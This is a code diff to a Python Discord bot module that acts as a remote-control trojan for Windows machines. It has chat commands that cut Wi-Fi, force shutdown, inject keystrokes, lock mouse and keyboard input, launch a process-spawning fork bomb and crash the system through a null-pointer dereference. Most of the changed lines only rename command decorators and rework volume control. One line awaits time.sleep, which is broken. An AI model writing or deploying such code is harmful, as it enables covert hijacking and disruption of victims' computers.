@@ -29,6 +29,7 @@ while subprocess.call(
 import os
 import io
 import time
+import math
 import pynput
 import asyncio
 import discord
@@ -62,26 +63,37 @@ class Lib(commands.Cog):
         self.keyboard_listener = None
 
         devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
         self.volume = cast(interface, POINTER(IAudioEndpointVolume))
 
 
-    @commands.command()
+    @commands.command(
+        name='hello',
+        brief='',
+        description=''
+    )
     async def hello(self, ctx, *, member: discord.Member = None):
         """Says hello"""
         member = member or ctx.author
         await ctx.send(f'Welcome summoner,  {member.name}~ Hehehe :)')
 
 
-    @commands.command()
+    @commands.command(
+        name='off_wifi',
+        brief='',
+        description=''
+    )
     async def off_wifi(self, ctx, time_sec:int = 1):
         for i in range(time_sec):
             os.system('netsh wlan disconnect')
             await time.sleep(1)
 
 
-    @commands.command()
+    @commands.command(
+        name='shutdown',
+        brief='',
+        description=''
+    )
     async def shutdown(self, ctx, time_sec:int = 0):
         if time_sec == -1:
             os.system(f'shutdown /a')
@@ -89,7 +101,11 @@ class Lib(commands.Cog):
             os.system(f'shutdown /s /t {time_sec}')
     
 
-    @commands.command()
+    @commands.command(
+        name='type',
+        brief='',
+        description=''
+    )
     async def type(self, ctx, *, cmds_line):
         c = Controller()
         special_keys = Key.__members__
@@ -153,18 +169,30 @@ class Lib(commands.Cog):
             await asyncio.sleep(0.3)
                         
 
-    @commands.command()
+    @commands.command(
+        name='site',
+        brief='',
+        description=''
+    )
     async def site(self, ctx, url):
         webbrowser.open(url, new=1)
 
 
-    @commands.command(brief='Frequency must be in 37 thru 32767')
+    @commands.command(
+        name='beep',
+        brief='Frequency must be in 37 thru 32767',
+        description=''
+    )
     async def beep(self, ctx, time_sec:int=1, freq:int=2500):
         time_sec *= 1000
         winsound.Beep(freq, time_sec)
 
 
-    @commands.command(brief='Only accepts WAV file')
+    @commands.command(
+        name='play_sound',
+        brief='Only accepts WAV file',
+        description=''
+    )
     async def play_sound(self, ctx, loop:bool=False):
         flags = winsound.SND_ASYNC | winsound.SND_ALIAS
         if loop:
@@ -185,7 +213,11 @@ class Lib(commands.Cog):
             winsound.PlaySound(self.tmp_sound, flags)
 
 
-    @commands.command()
+    @commands.command(
+        name='stop_sound',
+        brief='',
+        description=''
+    )
     async def stop_sound(self, ctx, loop:bool=False):
         if self.tmp_sound:
             winsound.PlaySound(None, winsound.SND_ASYNC)
@@ -193,7 +225,11 @@ class Lib(commands.Cog):
             self.tmp_sound = None
     
 
-    @commands.command()
+    @commands.command(
+        name='lock_input',
+        brief='',
+        description=''
+    )
     async def lock_input(self, ctx):
         # Disable mouse and keyboard events
         if self.mouse_listener:
@@ -207,7 +243,11 @@ class Lib(commands.Cog):
         self.keyboard_listener.start()
 
 
-    @commands.command()
+    @commands.command(
+        name='unlock_input',
+        brief='',
+        description=''
+    )
     async def unlock_input(self, ctx):
         # Enable mouse and keyboard events
         if self.mouse_listener:
@@ -219,20 +259,32 @@ class Lib(commands.Cog):
             self.keyboard_listener = None
 
 
-    @commands.command()
+    @commands.command(
+        name='set_volume',
+        brief='',
+        description=''
+    )
     async def set_volume(self, ctx, value:int):
-        _min, _max , *_ = self.volume.GetVolumeRange()
-        self.volume.SetMasterVolumeLevel(_min if not value else _max, None)
+        percentage = min(max(value, 0), 100) / 100
+        self.volume.SetMasterVolumeLevelScalar(percentage, None)
 
 
-    @commands.command()
+    @commands.command(
+        name='image',
+        brief='',
+        description=''
+    )
     async def image(self, ctx):
         if ctx.message.attachments:
             data = await ctx.message.attachments[0].read()
             Image.open(io.BytesIO(data)).show()
 
 
-    @commands.command()
+    @commands.command(
+        name='bomb',
+        brief='',
+        description=''
+    )
     async def bomb(self, ctx, level:int=1, time_sec:int=10):
         cmd = 'for /l %a in (0,0,0) do start /MIN'
         
@@ -245,7 +297,11 @@ class Lib(commands.Cog):
             Popen("TASKKILL /F /PID {pid} /T".format(pid=proc.pid), creationflags=CREATE_NO_WINDOW).wait()
 
 
-    @commands.command()
+    @commands.command(
+        name='crash',
+        brief='',
+        description=''
+    )
     async def crash(self, ctx):
         nullptr = POINTER(c_int)()
 
